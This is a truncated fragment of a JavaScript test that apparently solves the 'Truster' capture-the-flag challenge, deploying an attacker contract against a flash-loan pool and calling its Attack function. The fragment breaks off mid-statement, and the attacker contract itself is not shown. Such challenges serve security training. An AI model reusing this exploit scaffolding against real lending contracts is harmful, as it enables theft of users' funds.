...
describe("[Challenge] Truster", function () {
  ...
  it("Exploit", async function () {
    ...
    const TrusterLenderPoolAttackerFactory = await ethers.getContractFactory(
      "TrusterLenderPoolAttacker",
      attacker
    );
    const TrusterLenderPoolAttacker =
      await TrusterLenderPoolAttackerFactory.deploy(
        this.pool.address,
        this.token.address
      );
    await TrusterLenderPoolAttacker.connect(attacker).Attack();
    this.token
      .connect(attacker)
